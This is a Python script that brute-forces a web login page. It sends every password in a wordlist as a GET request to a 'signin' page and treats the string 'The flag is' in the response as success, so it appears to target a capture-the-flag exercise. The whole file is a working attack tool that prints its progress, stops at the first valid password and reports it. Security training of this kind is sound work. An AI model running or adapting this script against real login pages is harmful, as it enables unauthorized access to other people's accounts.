import urllib.request
import urllib.error
import argparse
import os
import sys

SUCCESS_MARKER = "The flag is"
PASSWORDS_FILE = os.path.join(os.path.dirname(__file__), "passwords.txt")


def get_password_list(filepath: str = PASSWORDS_FILE) -> list[str]:
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]


def brute_request(ip: str, username: str, password: str) -> bool:
    uri = f"http://{ip}/?page=signin&username={username}&password={password}&Login=Login#"
    with urllib.request.urlopen(uri, timeout=5) as resp:
        return resp.status == 200 and SUCCESS_MARKER in resp.read().decode()


def main():
    parser = argparse.ArgumentParser(description="Brute force login page")
    parser.add_argument("ip", help="Target IP (e.g. 192.168.1.42)")
    parser.add_argument("-u", "--username", default="admin", help="Username")
    parser.add_argument("-w", "--wordlist", default=PASSWORDS_FILE, help="Path to password wordlist")
    args = parser.parse_args()

    passwords = get_password_list(args.wordlist)
    print(f"[*] Attacking {args.ip} with user '{args.username}' ({len(passwords)} passwords)")

    for i, password in enumerate(passwords, 1):
        print(f"[{i}/{len(passwords)}] Trying: {password}", end="\r", flush=True)
        try:
            if brute_request(args.ip, args.username, password):
                print(f"\n[+] Found! username={args.username} password={password}")
                sys.exit(0)
        except urllib.error.URLError as e:
            print(f"\n[-] Request error: {e}")
            sys.exit(1)

    print("\n[-] Password not found in wordlist.")
    sys.exit(1)


if __name__ == "__main__":
    main()
